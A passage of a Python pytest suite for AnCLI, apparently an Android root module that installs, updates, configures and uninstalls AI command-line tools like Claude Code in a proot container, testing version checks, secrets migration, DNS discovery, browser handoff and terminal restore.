        app = data['apps'][0]
        assert data['last_check'] == 1700000000
        assert data['check_ttl'] == core.CHECK_TTL
        assert app['cloud_version'] == '2.1.283'
        assert app['update_available'] is True

    def test_list_apps_json_flags_update_for_unverified_legacy_record(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        # Legacy record: holds the AnCLI version (1.2.2) instead of the tool's own.
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "1.2.2", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code", "error": None}}})

        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert app['version_verified'] is False
        assert app['update_available'] is True   # no longer silently "up to date"

    def test_list_apps_json_reports_unknown_official_source(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch, apps={
            "grok": {"name": "Grok CLI", "executable": "grok", "version_cmd": "grok --version",
                     "latest": {"source": "none"}, "version": "1.0.41"}})
        core.save_installed({"grok": {"name": "Grok CLI", "executable": "grok",
                                      "installed_version": "1.0.0", "version_verified": True, "env": {}}})
        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert app['cloud_source'] == 'none'
        assert app['update_available'] is False

    def test_update_app_failure_returns_false_and_keeps_record(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: False)

        assert core.update_app('claude-code', registry) is False
        assert core.load_installed()['claude-code']['installed_version'] == '2.1.226'
        assert 'Update failed' in capsys.readouterr().out

    def test_update_app_success_records_probed_version(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        assert core.update_app('claude-code', registry) is True
        installed = core.load_installed()
        assert installed['claude-code']['installed_version'] == '2.1.283'
        assert installed['claude-code']['version_verified'] is True
        capsys.readouterr()

    def test_update_app_refreshes_official_version_without_claiming_a_full_check(self, tmp_path, monkeypatch, capsys):
        """The 更新 button pulls the vendor channel; the new official version must
        land in the cache right away, but `ts` (last full check) must not move."""
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})
        core._save_update_cache({"ts": 111, "latest": {}})

        assert core.update_app('claude-code', registry) is True
        cache = core._load_update_cache()
        assert cache['ts'] == 111
        assert cache['latest']['claude-code']['version'] == '2.1.283'
        assert 'official latest' in capsys.readouterr().out

    def test_update_app_warns_when_the_source_lags_behind(self, tmp_path, monkeypatch, capsys):
        registry = self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "1.0.0", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '1.0.0')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v1.1.0'})

        core.update_app('claude-code', registry)
        out = capsys.readouterr().out
        assert 'may lag behind the vendor' in out

    def test_update_cmd_is_exposed_to_the_webui(self, tmp_path, monkeypatch, capsys):
        self._env(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core.list_apps_json()
        app = json.loads(capsys.readouterr().out)['apps'][0]
        assert 'releases/latest/download/claude-linux-arm64.tar.gz' in app['update_cmd']

# ---------------------------------------------------------------------------
# Registry schema: every app must be updatable by construction
# ---------------------------------------------------------------------------

def test_registry_declares_probe_and_official_source():
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    required_key = {'github': 'repo', 'pypi': 'package', 'npm': 'package',
                    'json': 'url', 'text': 'urls', 'static': None, 'none': None}
    assert reg['apps'], 'registry must define apps'
    for aid, app in reg['apps'].items():
        assert app.get('version_cmd'), f'{aid}: version_cmd is required to read the real installed version'
        assert app.get('version'), f'{aid}: a declared fallback version is required'
        spec = app.get('latest')
        assert isinstance(spec, dict), f'{aid}: latest spec is required'
        assert spec.get('source') in required_key, f'{aid}: unknown latest.source {spec.get("source")!r}'
        key = required_key[spec['source']]
        if key:
            assert spec.get(key), f'{aid}: latest.{key} is required for source {spec["source"]}'
        for field in ('executable', 'install_cmd', 'uninstall_cmd'):
            assert app.get(field), f'{aid}: {field} is required'


# ---------------------------------------------------------------------------
# Fixes from the independent review (findings reproduced on device)
# ---------------------------------------------------------------------------

def _core_paths(tmp_path, monkeypatch, apps=None):
    """Point the core at a scratch filesystem and return a small registry."""
    monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
    monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
    monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
    monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
    monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
    monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
    monkeypatch.setattr(core, "INSTALLED_FILE", str(tmp_path / "ancli" / "installed.json"))
    monkeypatch.setattr(core, "UPDATE_CACHE", str(tmp_path / "ancli" / ".update_cache.json"))
    os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
    os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)
    return {"version": "1.2.3", "apps": apps if apps is not None else {
        "claude-code": {"name": "Claude Code", "executable": "claude",
                        "version_cmd": "claude --version",
                        "update_cmd": "curl -L https://example/claude.tar.gz",
                        "uninstall_cmd": "rm -f /usr/local/bin/claude",
                        "latest": {"source": "github", "repo": "anthropics/claude-code"},
                        "version": "2.1.283",
                        "optional_env_vars": ["ANTHROPIC_API_KEY"]},
    }}


class TestConfigEncoding:
    """WebUI sends percent-encoded --set values; they must be decoded on the way in
    and repaired on disk (tools were receiving literal 'https%3A%2F%2F...')."""

    def test_parse_set_env_decodes_percent_encoding(self):
        pairs = core.parse_set_env([
            "--set", "ANTHROPIC_BASE_URL=https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
            "--set", "ANTHROPIC_MODEL=deepseek-v4-flash",
        ])
        assert pairs["ANTHROPIC_BASE_URL"] == "https://api.deepseek.com/anthropic"
        assert pairs["ANTHROPIC_MODEL"] == "deepseek-v4-flash"

    def test_parse_set_env_is_idempotent_for_plain_values(self):
        assert core.parse_set_env(["--set", "HTTP_PROXY=http://127.0.0.1:7890"])["HTTP_PROXY"] == \
            "http://127.0.0.1:7890"

    def test_migrate_decodes_stored_values_and_rewrites_secrets(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        (tmp_path / "ancli" / "installed.json").write_text(json.dumps({
            "claude-code": {"executable": "claude", "env": {
                "ANTHROPIC_BASE_URL": "https%3A%2F%2Fapi.deepseek.com%2Fanthropic",
                "ANTHROPIC_API_KEY": "sk-plain"}}}), encoding="utf-8")

        changed = core.migrate_encoded_env()

        assert changed == {"claude-code": {
            "ANTHROPIC_BASE_URL": "https://api.deepseek.com/anthropic",
            "ANTHROPIC_API_KEY": "sk-plain"}}
        stored = core.load_installed()["claude-code"]
        assert stored["configured_env"] == ["ANTHROPIC_BASE_URL", "ANTHROPIC_API_KEY"]
        secrets = (tmp_path / "secrets" / "claude.env").read_text(encoding="utf-8")
        assert "https://api.deepseek.com/anthropic" in secrets
        assert "%3A" not in secrets
        capsys.readouterr()

    def test_migrate_is_a_noop_for_clean_values(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "env": {"ANTHROPIC_BASE_URL": "https://api.deepseek.com"}}})
        assert core.migrate_encoded_env() == {}
        assert not (tmp_path / "secrets" / "claude.env").exists()
        capsys.readouterr()


class TestReinstallKeepsConfig:
    def test_install_common_carries_env_and_secrets_over(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        (tmp_path / "ancli" / "installed.json").write_text(json.dumps({
            "claude-code": {"executable": "claude", "installed_version": "2.1.226",
                             "version_verified": True,
                             "env": {"ANTHROPIC_API_KEY": "sk-keep"}}}), encoding="utf-8")
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.283')
        app = {"name": "Claude Code", "executable": "claude", "version_cmd": "claude --version"}

        core._install_proot_common("claude-code", app)

        record = core.load_installed()["claude-code"]
        assert record["configured_env"] == ["ANTHROPIC_API_KEY"]   # not wiped by a re-install
        assert record["installed_version"] == "2.1.283"
        assert "secrets/claude.env" in (tmp_path / "ancli" / "bin" / "claude").read_text(encoding="utf-8")
        assert "sk-keep" in (tmp_path / "secrets" / "claude.env").read_text(encoding="utf-8")
        capsys.readouterr()


class TestUninstallFlow:
    def _install_artifacts(self, tmp_path):
        for path in (tmp_path / "ancli" / "bin" / "claude",
                     tmp_path / "mod" / "system" / "bin" / "claude",
                     tmp_path / "ksu" / "claude",
                     tmp_path / "ap" / "claude"):
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("wrapper")
        (tmp_path / "secrets").mkdir(parents=True, exist_ok=True)
        (tmp_path / "secrets" / "claude.env").write_text("export K=1\n")

    def test_uninstall_removes_every_injection_path_and_the_cache_entry(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:x", "error": None}}})
        self._install_artifacts(tmp_path)
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: True)

        assert core.uninstall_app("claude-code", registry) is True

        assert core.load_installed() == {}
        for path in (tmp_path / "ancli" / "bin" / "claude",
                     tmp_path / "mod" / "system" / "bin" / "claude",
                     tmp_path / "ksu" / "claude",
                     tmp_path / "ap" / "claude",
                     tmp_path / "secrets" / "claude.env"):
            assert not path.exists(), path
        assert 'claude-code' not in core._load_update_cache()['latest']
        capsys.readouterr()

    def test_uninstall_reports_failure_when_the_tool_command_fails(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"name": "Claude Code", "executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'run_cmd', lambda cmd: False)

        assert core.uninstall_app("claude-code", registry) is False
        assert core.load_installed() == {}      # record still removed, but exit code is honest
        capsys.readouterr()


class TestConcurrentWrites:
    def test_merge_does_not_resurrect_or_clobber_other_fields(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"a": {"installed_version": "2.0", "env": {"K": "v"},
                                   "installed_at": "t1"},
                             "b": {"installed_version": "9.9"}})

        core._merge_installed_fields({"a": {"installed_version": "1.0", "version_verified": True},
                                      "ghost": {"installed_version": "3.3"}})

        data = core.load_installed()
        assert data["a"]["installed_version"] == "1.0"     # this run is authoritative for it
        assert data["a"]["version_verified"] is True
        assert data["a"]["configured_env"] == ["K"]          # untouched fields survive
        assert data["a"]["installed_at"] == "t1"
        assert data["b"]["installed_version"] == "9.9"     # app installed mid-run survives
        assert "ghost" not in data                         # uninstalled app is not resurrected

    def test_check_updates_does_not_delete_an_app_installed_mid_run(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})

        def probe(app, reg=None):
            # Simulate the user installing another tool while the check is running.
            current = core.load_installed()
            current["opencode"] = {"executable": "opencode", "installed_version": "1.18.32"}
            core.save_installed(current)
            return '2.1.283'

        monkeypatch.setattr(core, '_probe_installed_version', probe)
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        core.check_updates(registry)

        data = core.load_installed()
        assert "opencode" in data
        assert data["claude-code"]["installed_version"] == "2.1.283"
        capsys.readouterr()


class TestCheckFailureHandling:
    def test_failed_lookup_keeps_the_previously_resolved_version(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 111, "latest": {
            "claude-code": {"version": "2.1.283", "source": "github:anthropics/claude-code",
                            "error": None}}})

        def boom(url, timeout=15):
            raise OSError('network down')

        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', boom)

        cache = core.check_updates(registry)

        entry = cache['latest']['claude-code']
        assert entry['version'] == '2.1.283'          # a transient outage must not wipe it
        assert 'network down' in entry['error']
        assert (cache['failed'], cache['succeeded']) == (1, 0)
        capsys.readouterr()

    def test_list_json_shortens_the_check_ttl_after_failures(self, tmp_path, monkeypatch, capsys):
        _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        core._save_update_cache({"ts": 1, "latest": {}, "failed": 2})

        core.list_apps_json()

        data = json.loads(capsys.readouterr().out)
        assert data['check_ttl'] == core.CHECK_TTL_FAILED
        assert data['check_failed'] == 2

    def test_check_updates_json_reports_counts(self, tmp_path, monkeypatch, capsys):
        registry = _core_paths(tmp_path, monkeypatch)
        core.save_installed({"claude-code": {"executable": "claude",
                                             "installed_version": "2.1.226", "env": {}}})
        monkeypatch.setattr(core, 'load_registry', lambda: registry)
        monkeypatch.setattr(core, '_probe_installed_version', lambda app, reg=None: '2.1.226')
        monkeypatch.setattr(core, '_http_json', lambda url, timeout=15: {'tag_name': 'v2.1.283'})

        cache = core.check_updates_json()

        assert (cache['succeeded'], cache['failed']) == (1, 0)
        capsys.readouterr()


class TestStateFilePermissions:
    """AnCLI is a root tool, so its state files need no world-write bit."""

    def test_installed_json_is_written_0644(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        modes = []
        monkeypatch.setattr(core.os, "chmod", lambda p, m: modes.append((os.path.basename(str(p)), m)))

        core.save_installed({"a": {"installed_version": "1.0"}})

        assert ('installed.json', 0o644) in modes
        assert not any(m == 0o666 for _, m in modes)

    def test_update_cache_is_written_0644(self, tmp_path, monkeypatch):
        _core_paths(tmp_path, monkeypatch)
        modes = []
        monkeypatch.setattr(core.os, "chmod", lambda p, m: modes.append((os.path.basename(str(p)), m)))

        assert core._save_update_cache({"ts": 1, "latest": {}}) is True

        assert ('.update_cache.json', 0o644) in modes
        assert not any(m == 0o666 for _, m in modes)


def test_release_version_strings_move_together():
    """module.prop, update.json and the core's VERSION are one release: the manager
    reads the first two while `ancli --version` and the WebUI read the third, so a
    half-bumped release shows two different versions."""
    root = os.path.join(os.path.dirname(__file__), '..')

    with open(os.path.join(root, 'src', 'module', 'module.prop'), encoding='utf-8') as f:
        prop = f.read()
    with open(os.path.join(root, 'update.json'), encoding='utf-8') as f:
        manifest = json.load(f)

    prop_version = re.search(r'^version=(.+)$', prop, re.M).group(1).strip()
    prop_code = int(re.search(r'^versionCode=(\d+)$', prop, re.M).group(1))

    assert prop_version == manifest['version'] == 'v' + core.VERSION
    assert prop_code == manifest['versionCode']
    assert manifest['zipUrl'].endswith(f"ancli-{prop_version}.zip")

    # customize.sh announces the version in the flash log: it must read module.prop,
    # not carry a literal that goes stale (the v1.2.4 log said v1.2.3).
    with open(os.path.join(root, 'src', 'module', 'customize.sh'), encoding='utf-8') as f:
        customize = f.read()
    assert not re.search(r'Installer v?\d+\.\d+', customize), \
        'customize.sh must interpolate MODULE_VERSION instead of hardcoding it'
    assert 'MODULE_VERSION' in customize

    # registry.json carries a top-level version purely as bookkeeping (no code reads
    # it), which is exactly how it silently lagged a release behind. Keep it synced.
    with open(os.path.join(root, 'src', 'registry.json'), encoding='utf-8') as f:
        registry = json.load(f)
    assert registry.get('version') == core.VERSION, \
        'registry.json top-level version drifts from the core VERSION'

    # The release tool must not pin a version of its own: it edits five files from
    # one source, and the v1.2.4 cut shipped because it only knew about three.
    with open(os.path.join(root, 'scripts', 'prepare_release.py'), encoding='utf-8') as f:
        prepare = f.read()
    assert not re.search(r'^VERSION\s*=\s*[\'"]v?\d', prepare, re.M), \
        'prepare_release.py must take the version from argv/module.prop, not a literal'
    for target in ('module.prop', 'update.json', 'ancli-core.py', 'registry.json',
                   'CHANGELOG.md'):
        assert target in prepare, f'prepare_release.py must update {target}'


def test_github_release_downloads_fail_fast_and_are_verified():
    """GitHub-release installers must not silently unpack an HTML error page, and
    claude-code's published SHASUMS256.txt must actually be checked."""
    with open(os.path.join(os.path.dirname(__file__), '..', 'src', 'registry.json'), encoding='utf-8') as f:
        reg = json.load(f)
    github_apps = 0
    for aid, app in reg['apps'].items():
        cmd = app['install_cmd']
        if 'releases/latest/download' in cmd:
            github_apps += 1
            assert 'curl -fL' in cmd, f'{aid}: use `curl -fL` so a 404 fails instead of writing a body'
            assert '--retry' in cmd, f'{aid}: retry transient network failures'
            assert cmd.count('rm -f /tmp/') >= 1, f'{aid}: clean up the downloaded archive'
    assert github_apps >= 3, 'expected the GitHub-release apps to be covered'
    assert 'sha256sum -c' in reg['apps']['claude-code']['install_cmd'], \
        'claude-code ships SHASUMS256.txt — verify it'


def test_full_purge_uses_one_shot_marker():
    root = os.path.join(os.path.dirname(__file__), '..')
    with open(os.path.join(root, 'src', 'module', 'uninstall.sh'), encoding='utf-8') as f:
        uninstall = f.read()

    assert 'PURGE_MARKER="/data/local/tmp/ancli_force_purge"' in uninstall
    assert 'rm -f "$PURGE_MARKER"' in uninstall
    assert 'rm -rf "$ANCLI_DIR"' in uninstall
    assert 'rm -rf /data/local/tmp/ancli' not in uninstall


class TestAndroidDnsDiscovery:
    """The core cannot execute Android's getprop/dumpsys from inside the glibc guest
    (verified on device), so the host-side wrapper caches the real resolvers."""

    def _fake_subprocess(self, monkeypatch, props, dump):
        def fake_check_output(cmd, shell=True, **kwargs):
            if cmd.startswith("getprop"):
                return props.get(cmd.split()[-1], "").encode()
            if cmd.startswith("dumpsys"):
                return dump.encode()
            raise AssertionError(f"unexpected command {cmd}")

        monkeypatch.setattr(core.subprocess, "check_output", fake_check_output)

    def _cache(self, tmp_path, monkeypatch, content):
        path = tmp_path / ".dns_cache"
        if content is not None:
            path.write_text(content, encoding="utf-8")
        monkeypatch.setattr(core, "DNS_CACHE", str(path))
        return path

    def test_reads_the_host_probed_cache_first(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, "1790530000 192.168.1.1 2409:8080:2000:3::1\n")
        # Subprocess probes must not even be needed.
        monkeypatch.setattr(core.subprocess, "check_output",
                            lambda *a, **k: (_ for _ in ()).throw(AssertionError("probed anyway")))
        assert core._get_android_dns() == ["192.168.1.1"]   # IPv4 preferred, IPv6 dropped

    def test_ipv6_only_cache_is_used_when_nothing_else(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, "1790530000 2409:8080:2000:3::1\n")
        assert core._get_android_dns() == ["2409:8080:2000:3::1"]

    def test_falls_back_to_props_when_no_cache(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        self._fake_subprocess(monkeypatch, {"net.dns1": "10.0.0.1", "net.dns2": "10.0.0.1"},
                              "DnsAddresses: [ /1.1.1.1 ]")
        assert core._get_android_dns() == ["10.0.0.1"]

    def test_falls_back_to_dumpsys_when_props_are_empty(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        dump = ("DnsAddresses: [ /2409:8080:2000:3::1,/2409:8080:2000:3::2 ]\n"
                "DnsAddresses: [ /192.168.1.1 ]")
        self._fake_subprocess(monkeypatch, {"net.dns1": "", "net.dns2": ""}, dump)
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_rejects_loopback_and_placeholder(self, tmp_path, monkeypatch):
        self._cache(tmp_path, monkeypatch, None)
        self._fake_subprocess(monkeypatch, {"net.dns1": "127.0.0.1", "net.dns2": "0.0.0.0"},
                              "DnsAddresses: [ /192.168.1.1 ]")
        assert core._get_android_dns() == ["192.168.1.1"]

    def test_resolv_conf_keeps_public_fallbacks_last(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path))
        os.makedirs(tmp_path / "etc", exist_ok=True)
        self._cache(tmp_path, monkeypatch, "1790530000 192.168.1.1\n")

        core._write_resolv_conf()

        lines = (tmp_path / "etc" / "resolv.conf").read_text(encoding="utf-8").splitlines()
        assert lines[0] == "nameserver 192.168.1.1"     # the real network DNS leads
        assert "nameserver 223.5.5.5" in lines
        assert len(lines) == 3                          # glibc reads only three
        assert "8.8.8.8" not in lines                   # not first, and slots are full


class TestBrowserHandoff:
    """`dsh web` (npm `open` → xdg-open) must reach the phone's browser.

    Android's `am`/`cmd` cannot execute inside the glibc guest, so the container
    shim only queues the URL and the host-side wrapper drains it into `am start`."""

    def _paths(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)
        os.makedirs(tmp_path / "rootfs" / "usr" / "local" / "bin", exist_ok=True)

    def test_container_shim_queues_the_url_instead_of_calling_am(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core._deploy_xdg_open()

        shim = tmp_path / "rootfs" / "usr" / "local" / "bin" / "xdg-open"
        text = shim.read_text(encoding="utf-8")
        # Compare separator-insensitively: the shim is a POSIX script, but the test
        # runs on Windows too, where ANCLI_DIR carries backslashes.
        queue = str(tmp_path / "ancli" / ".open_url").replace("\\", "/")
        assert queue in text.replace("\\", "/")                    # hands off to the host
        assert "/system/bin/am" not in text                        # cannot exec there
        assert os.access(shim, os.X_OK)
        # lookups that hardcode /usr/bin or /bin still resolve (symlinks need
        # privileges on Windows, so only check them where the module actually runs)
        if os.name == "posix":
            assert (tmp_path / "rootfs" / "usr" / "bin" / "xdg-open").is_symlink()
            assert (tmp_path / "rootfs" / "bin" / "sensible-browser").is_symlink()

    @pytest.mark.skipif(os.name != "posix", reason="the host copy is installed with `cp`")
    def test_host_copy_still_uses_am(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "ksu", exist_ok=True)
        core._deploy_xdg_open()

        host = (tmp_path / "ksu" / "xdg-open").read_text(encoding="utf-8")
        assert "/system/bin/am start" in host

    def test_generated_wrapper_drains_the_queue_with_am(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert ".open_url" in wrapper
        assert "ancli_open_drain" in wrapper
        assert "/system/bin/am start -a android.intent.action.VIEW" in wrapper
        assert "kill -0 \"$PPID\"" in wrapper      # watcher dies with the wrapper
        assert '"$@"' in wrapper                   # the tool still gets its arguments

    def test_wrapper_watcher_only_starts_when_the_queue_is_writable(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert '[ -w "$(dirname "$ANCLI_OPEN_QUEUE")" ]' in wrapper

    def test_wrapper_points_browser_at_the_handoff_shim(self, tmp_path, monkeypatch):
        """The npm `open` package prefers its vendored xdg-open, which finds no
        method on a headless container (rc 3) unless BROWSER points at our shim."""
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert "/usr/bin/env PATH=/usr/local/bin:/usr/bin:/bin SHELL=/bin/bash BROWSER=/usr/local/bin/xdg-open dsh" in wrapper

    def test_wrapper_prefers_a_full_browser_over_the_chooser(self, tmp_path, monkeypatch):
        """No default browser => `am start` raises "Open with"; a WebView-based pick
        can drop the auth cookie, so a known browser is targeted explicitly."""
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("dsh", {}, [])

        wrapper = (tmp_path / "ancli" / "bin" / "dsh").read_text(encoding="utf-8")
        assert "com.android.chrome" in wrapper
        assert 'pm list packages "$_ancli_pkg"' in wrapper
        assert '-p "$_ancli_pkg"' in wrapper
        # the generic intent stays as the fallback for devices without those browsers
        assert '/system/bin/am start -a android.intent.action.VIEW -d "$1"' in wrapper
        assert "ancli_open_browser" in wrapper


class TestTerminalRestore:
    """A full-screen TUI (mimo, agy, opencode) leaves the tty in raw mode when it
    dies without restoring it: the caller's shell then looks dead — no echo, Enter
    only moves the cursor, no command runs — and only a new terminal recovers it.
    The guest process is gone by then, so the wrapper is the last chance to put
    termios back; `exec` must not be used because it replaces that wrapper."""

    def _paths(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "ANCLI_DIR", str(tmp_path / "ancli"))
        monkeypatch.setattr(core, "MOD_DIR", str(tmp_path / "mod"))
        monkeypatch.setattr(core, "KSU_BIN", str(tmp_path / "ksu"))
        monkeypatch.setattr(core, "AP_BIN", str(tmp_path / "ap"))
        monkeypatch.setattr(core, "SECRETS_DIR", str(tmp_path / "secrets"))
        os.makedirs(tmp_path / "ancli" / "bin", exist_ok=True)

    def test_proot_wrapper_saves_and_restores_the_tty(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("mimo", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")

        assert "stty -g" in wrapper
        assert 'stty "$_ancli_saved_tty"' in wrapper
        assert "trap 'ancli_restore_tty' EXIT" in wrapper
        assert "ancli_restore_tty" in wrapper.split("proot -r", 1)[1]
        assert not re.search(r"^exec ", wrapper, re.M), \
            "the wrapper must survive the tool so it can restore the terminal"

    def test_proot_wrapper_mounts_the_channel(self, tmp_path, monkeypatch):
        self._paths(tmp_path, monkeypatch)
        core.generate_proot_wrapper("mimo", {}, [])
        wrapper = (tmp_path / "ancli" / "bin" / "mimo").read_text(encoding="utf-8")
        assert f"ANCLI_DATA_MNT={core.ANDROID_DATA_MNT}" in wrapper
        assert 'mount --bind /data "$ANCLI_DATA_MNT"' in wrapper
        assert "/proc/mounts" in wrapper          # idempotent: never stack mounts
        assert 'id -u' in wrapper                 # best effort: root only

    def test_ensure_android_data_is_idempotent(self, monkeypatch):
        calls = []
        monkeypatch.setattr(core, "_android_data_mounted", lambda: True)
        monkeypatch.setattr(core.os, "system", lambda cmd: calls.append(cmd) or 0)
        assert core.ensure_android_data(verbose=False) is True
        assert calls == [], "must not mount again when the channel already exists"

    def test_ensure_android_data_reports_failure_without_raising(self, monkeypatch, tmp_path):
        monkeypatch.setattr(core, "_android_data_mounted", lambda: False)
        monkeypatch.setattr(core, "ANDROID_DATA_MNT", str(tmp_path / "mnt" / "ancli-data"))
        monkeypatch.setattr(core.os, "system", lambda cmd: 1)
        assert core.ensure_android_data(verbose=False) is False


class TestDefaultWorkingDirectory:
    """A tool launched from `/` starts in a small directory instead of scanning
    the whole container; users can point that at a project tree with
    `ancli config --set default_cwd=...` (also editable in the WebUI)."""

    def _cfg(self, tmp_path, monkeypatch):
        monkeypatch.setattr(core, "CONFIG_FILE", str(tmp_path / "cfg.json"))
        monkeypatch.setattr(core, "ROOTFS", str(tmp_path / "rootfs"))

    def test_bind_root_is_accepted_without_a_disk_entry(self, tmp_path, monkeypatch):
        # /sdcard only exists once the wrapper binds it, never under $ROOTFS.
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_default_cwd("/sdcard/projects")
        assert ok and err == ""
        assert core.get_default_cwd() == "/sdcard/projects"

    def test_relative_and_traversal_paths_are_rejected(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        for bad in ("sdcard", "../etc", "/sdcard/../../etc", ""):
            if bad == "":
                continue
            ok, err = core.set_default_cwd(bad)
            assert ok is False and err

    def test_missing_container_directory_is_rejected(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        ok, err = core.set_default_cwd("/nope/definitely-missing")
        assert ok is False and "看不到" in err
        assert core.get_default_cwd() == ""

    def test_existing_container_directory_is_accepted(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        os.makedirs(tmp_path / "rootfs" / "srv" / "project")
        ok, err = core.set_default_cwd("/srv/project")
        assert ok and err == ""

    def test_empty_value_resets_to_the_builtin(self, tmp_path, monkeypatch):
        self._cfg(tmp_path, monkeypatch)
        core.set_default_cwd("/sdcard")
